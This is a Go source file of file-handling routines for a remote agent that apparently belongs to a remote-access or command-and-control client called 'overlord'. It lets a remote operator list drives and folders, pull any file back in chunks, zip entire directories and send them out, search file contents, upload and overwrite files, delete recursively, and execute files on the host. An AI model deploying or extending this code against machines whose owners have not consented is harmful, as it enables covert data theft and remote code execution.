package handlers

import (
	"archive/zip"
	"bufio"
	"bytes"
	"context"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"
	"unicode/utf8"

	agentRuntime "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

const maxChunkSize = 512 * 1024

func HandleFileList(ctx context.Context, env *agentRuntime.Env, cmdID string, path string) error {
	log.Printf("file_list: %s", path)

	if path == "" {
		path = "."
	}

	if path == "." && runtime.GOOS == "windows" {
		return listWindowsDrives(ctx, env, cmdID)
	}

	entries := []wire.FileEntry{}
	var errMsg string

	dirEntries, err := os.ReadDir(path)
	if err != nil {
		errMsg = err.Error()
		log.Printf("file_list error: %v", err)
	} else {
		for _, entry := range dirEntries {
			info, err := entry.Info()
			if err != nil {
				continue
			}

			fullPath := filepath.Join(path, entry.Name())
			fileEntry := wire.FileEntry{
				Name:    entry.Name(),
				Path:    fullPath,
				IsDir:   entry.IsDir(),
				Size:    info.Size(),
				ModTime: info.ModTime().Unix(),
			}

			enrichFileEntry(&fileEntry, info)

			entries = append(entries, fileEntry)
		}
	}

	result := wire.FileListResult{
		Type:      "file_list_result",
		CommandID: cmdID,
		Path:      path,
		Entries:   entries,
		Error:     errMsg,
	}

	return wire.WriteMsg(ctx, env.Conn, result)
}

func listWindowsDrives(ctx context.Context, env *agentRuntime.Env, cmdID string) error {
	entries := []wire.FileEntry{}

	for drive := 'A'; drive <= 'Z'; drive++ {
		drivePath := string(drive) + ":\\"
		if _, err := os.Stat(drivePath); err == nil {

			entries = append(entries, wire.FileEntry{
				Name:    string(drive) + ":",
				Path:    drivePath,
				IsDir:   true,
				Size:    0,
				ModTime: time.Now().Unix(),
			})
		}
	}

	result := wire.FileListResult{
		Type:      "file_list_result",
		CommandID: cmdID,
		Path:      ".",
		Entries:   entries,
		Error:     "",
	}

	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleFileDownload(ctx context.Context, env *agentRuntime.Env, cmdID string, path string) error {
	log.Printf("file_download: %s", path)

	file, err := os.Open(path)
	if err != nil {
		result := wire.FileDownload{
			Type:      "file_download",
			CommandID: cmdID,
			Path:      path,
			Error:     err.Error(),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}
	defer file.Close()

	stat, err := file.Stat()
	if err != nil {
		result := wire.FileDownload{
			Type:      "file_download",
			CommandID: cmdID,
			Path:      path,
			Error:     err.Error(),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}

	total := stat.Size()
	offset := int64(0)
	buffer := make([]byte, maxChunkSize)

	for {
		n, err := file.Read(buffer)
		if err != nil && err != io.EOF {
			result := wire.FileDownload{
				Type:      "file_download",
				CommandID: cmdID,
				Path:      path,
				Error:     err.Error(),
				Offset:    offset,
				Total:     total,
			}
			return wire.WriteMsg(ctx, env.Conn, result)
		}

		if n > 0 {
			chunk := wire.FileDownload{
				Type:      "file_download",
				CommandID: cmdID,
				Path:      path,
				Data:      buffer[:n],
				Offset:    offset,
				Total:     total,
			}

			if err := wire.WriteMsg(ctx, env.Conn, chunk); err != nil {
				return err
			}
			offset += int64(n)
		}

		if err == io.EOF {
			break
		}
	}

	log.Printf("file_download complete: %s (%d bytes)", path, total)
	return nil
}

func HandleFileUpload(ctx context.Context, env *agentRuntime.Env, cmdID string, path string, data []byte, offset int64) error {
	log.Printf("file_upload: %s (offset: %d, size: %d)", path, offset, len(data))

	flag := os.O_CREATE | os.O_WRONLY
	if offset > 0 {
		flag |= os.O_APPEND
	} else {
		flag |= os.O_TRUNC
	}

	file, err := os.OpenFile(path, flag, 0644)
	if err != nil {
		result := wire.FileUploadResult{
			Type:      "file_upload_result",
			CommandID: cmdID,
			Path:      path,
			OK:        false,
			Error:     err.Error(),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}
	defer file.Close()

	if offset > 0 {
		_, err = file.Seek(offset, 0)
		if err != nil {
			result := wire.FileUploadResult{
				Type:      "file_upload_result",
				CommandID: cmdID,
				Path:      path,
				OK:        false,
				Error:     err.Error(),
			}
			return wire.WriteMsg(ctx, env.Conn, result)
		}
	}

	_, err = file.Write(data)
	if err != nil {
		result := wire.FileUploadResult{
			Type:      "file_upload_result",
			CommandID: cmdID,
			Path:      path,
			OK:        false,
			Error:     err.Error(),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}

	result := wire.FileUploadResult{
		Type:      "file_upload_result",
		CommandID: cmdID,
		Path:      path,
		OK:        true,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleFileDelete(ctx context.Context, env *agentRuntime.Env, cmdID string, path string) error {
	log.Printf("file_delete: %s", path)

	err := os.RemoveAll(path)
	ok := err == nil
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}

	result := wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        ok,
		Message:   errMsg,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleFileMkdir(ctx context.Context, env *agentRuntime.Env, cmdID string, path string) error {
	log.Printf("file_mkdir: %s", path)

	err := os.MkdirAll(path, 0755)
	ok := err == nil
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}

	result := wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        ok,
		Message:   errMsg,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleFileZip(ctx context.Context, env *agentRuntime.Env, cmdID string, sourcePath string) error {
	log.Printf("file_zip: %s", sourcePath)

	zipPath := sourcePath + ".zip"
	zipFile, err := os.Create(zipPath)
	if err != nil {
		result := wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        false,
			Message:   err.Error(),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}
	defer zipFile.Close()

	zipWriter := zip.NewWriter(zipFile)
	defer zipWriter.Close()

	totalFiles := 0
	filepath.Walk(sourcePath, func(path string, info os.FileInfo, err error) error {
		if err == nil && !info.IsDir() {
			totalFiles++
		}
		return nil
	})

	progressMsg := wire.CommandResult{
		Type:      "command_progress",
		CommandID: cmdID,
		OK:        true,
		Message:   fmt.Sprintf("Zipping 0/%d files...", totalFiles),
	}
	wire.WriteMsg(ctx, env.Conn, progressMsg)

	processedFiles := 0
	lastProgressUpdate := time.Now()

	err = filepath.Walk(sourcePath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		select {
		case <-ctx.Done():
			return ctx.Err()
		default:
		}

		header, err := zip.FileInfoHeader(info)
		if err != nil {
			return err
		}

		relPath, err := filepath.Rel(sourcePath, path)
		if err != nil {
			return err
		}
		header.Name = relPath

		if info.IsDir() {
			header.Name += "/"
		} else {
			header.Method = zip.Deflate
		}

		writer, err := zipWriter.CreateHeader(header)
		if err != nil {
			return err
		}

		if !info.IsDir() {
			file, err := os.Open(path)
			if err != nil {
				return err
			}
			defer file.Close()
			_, err = io.Copy(writer, file)
			if err != nil {
				return err
			}

			processedFiles++

			now := time.Now()
			if now.Sub(lastProgressUpdate) > 500*time.Millisecond || processedFiles%10 == 0 {
				progress := wire.CommandResult{
					Type:      "command_progress",
					CommandID: cmdID,
					OK:        true,
					Message:   fmt.Sprintf("Zipping %d/%d files...", processedFiles, totalFiles),
				}
				wire.WriteMsg(ctx, env.Conn, progress)
				lastProgressUpdate = now
			}
		}

		return nil
	})

	if err != nil {
		result := wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        false,
			Message:   err.Error(),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}

	zipWriter.Close()
	zipFile.Close()

	finalProgress := wire.CommandResult{
		Type:      "command_progress",
		CommandID: cmdID,
		OK:        true,
		Message:   fmt.Sprintf("Zip complete. %d files compressed.", processedFiles),
	}
	wire.WriteMsg(ctx, env.Conn, finalProgress)

	time.Sleep(100 * time.Millisecond)
	go HandleFileDownload(ctx, env, cmdID, zipPath)

	result := wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        true,
		Message:   "Zip created: " + zipPath,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleFileRead(ctx context.Context, env *agentRuntime.Env, cmdID string, path string, maxSize int64) error {
	log.Printf("file_read: %s", path)

	if maxSize == 0 {
		maxSize = 10 * 1024 * 1024
	}

	info, err := os.Stat(path)
	if err != nil {
		result := wire.FileReadResult{
			Type:      "file_read_result",
			CommandID: cmdID,
			Path:      path,
			Error:     err.Error(),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}

	if info.Size() > maxSize {
		result := wire.FileReadResult{
			Type:      "file_read_result",
			CommandID: cmdID,
			Path:      path,
			Error:     fmt.Sprintf("file too large: %d bytes (max: %d)", info.Size(), maxSize),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}

	data, err := os.ReadFile(path)
	if err != nil {
		result := wire.FileReadResult{
			Type:      "file_read_result",
			CommandID: cmdID,
			Path:      path,
			Error:     err.Error(),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}

	isBinary := !utf8.Valid(data)

	result := wire.FileReadResult{
		Type:      "file_read_result",
		CommandID: cmdID,
		Path:      path,
		Content:   string(data),
		IsBinary:  isBinary,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleFileWrite(ctx context.Context, env *agentRuntime.Env, cmdID string, path string, content string) error {
	log.Printf("file_write: %s", path)

	dir := filepath.Dir(path)
	if err := os.MkdirAll(dir, 0755); err != nil {
		result := wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        false,
			Message:   err.Error(),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}

	err := os.WriteFile(path, []byte(content), 0644)
	ok := err == nil
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}

	result := wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        ok,
		Message:   errMsg,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleFileSearch(ctx context.Context, env *agentRuntime.Env, cmdID string, searchID string, basePath string, pattern string, searchContent bool, maxResults int) error {
	log.Printf("file_search: path=%s pattern=%s content=%v", basePath, pattern, searchContent)

	if maxResults == 0 {
		maxResults = 1000
	}

	results := []wire.FileSearchMatch{}
	matchCount := 0

	err := filepath.Walk(basePath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}

		if matchCount >= maxResults {
			return filepath.SkipAll
		}

		if !searchContent {
			if strings.Contains(strings.ToLower(info.Name()), strings.ToLower(pattern)) {
				results = append(results, wire.FileSearchMatch{
					Path: path,
				})
				matchCount++
			}
			return nil
		}

		if !info.IsDir() && info.Size() < 10*1024*1024 {
			data, err := os.ReadFile(path)
			if err != nil || !utf8.Valid(data) {
				return nil
			}

			scanner := bufio.NewScanner(bytes.NewReader(data))
			lineNum := 1
			for scanner.Scan() {
				line := scanner.Text()
				if strings.Contains(strings.ToLower(line), strings.ToLower(pattern)) {
					results = append(results, wire.FileSearchMatch{
						Path:  path,
						Line:  lineNum,
						Match: line,
					})
					matchCount++
					if matchCount >= maxResults {
						break
					}
				}
				lineNum++
			}
		}

		return nil
	})

	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}

	result := wire.FileSearchResult{
		Type:      "file_search_result",
		CommandID: cmdID,
		SearchID:  searchID,
		Results:   results,
		Complete:  true,
		Error:     errMsg,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleFileCopy(ctx context.Context, env *agentRuntime.Env, cmdID string, source string, dest string) error {
	log.Printf("file_copy: %s -> %s", source, dest)

	info, err := os.Stat(source)
	if err != nil {
		result := wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        false,
			Message:   err.Error(),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}

	if info.IsDir() {
		err = copyDir(source, dest)
	} else {
		err = copyFile(source, dest)
	}

	ok := err == nil
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}

	result := wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        ok,
		Message:   errMsg,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleFileMove(ctx context.Context, env *agentRuntime.Env, cmdID string, source string, dest string) error {
	log.Printf("file_move: %s -> %s", source, dest)

	destDir := filepath.Dir(dest)
	if err := os.MkdirAll(destDir, 0755); err != nil {
		result := wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        false,
			Message:   err.Error(),
		}
		return wire.WriteMsg(ctx, env.Conn, result)
	}

	err := os.Rename(source, dest)
	ok := err == nil
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}

	result := wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        ok,
		Message:   errMsg,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return err
	}

	sourceInfo, err := os.Stat(src)
	if err != nil {
		return err
	}
	return os.Chmod(dst, sourceInfo.Mode())
}

func copyDir(src, dst string) error {
	sourceInfo, err := os.Stat(src)
	if err != nil {
		return err
	}

	if err := os.MkdirAll(dst, sourceInfo.Mode()); err != nil {
		return err
	}

	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}

	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())

		if entry.IsDir() {
			if err := copyDir(srcPath, dstPath); err != nil {
				return err
			}
		} else {
			if err := copyFile(srcPath, dstPath); err != nil {
				return err
			}
		}
	}

	return nil
}

func HandleFileChmod(ctx context.Context, env *agentRuntime.Env, cmdID string, path string, mode string) error {
	log.Printf("file_chmod: %s mode=%s", path, mode)

	err := ChangeFilePermissions(path, mode)
	ok := err == nil
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
	}

	result := wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        ok,
		Message:   errMsg,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}

func HandleFileExecute(ctx context.Context, env *agentRuntime.Env, cmdID string, path string) error {
	log.Printf("file_execute: %s", path)

	err := ExecuteFile(path)
	ok := err == nil
	errMsg := ""
	if err != nil {
		errMsg = err.Error()
		log.Printf("file_execute error: %v", err)
	}

	result := wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        ok,
		Message:   errMsg,
	}
	return wire.WriteMsg(ctx, env.Conn, result)
}
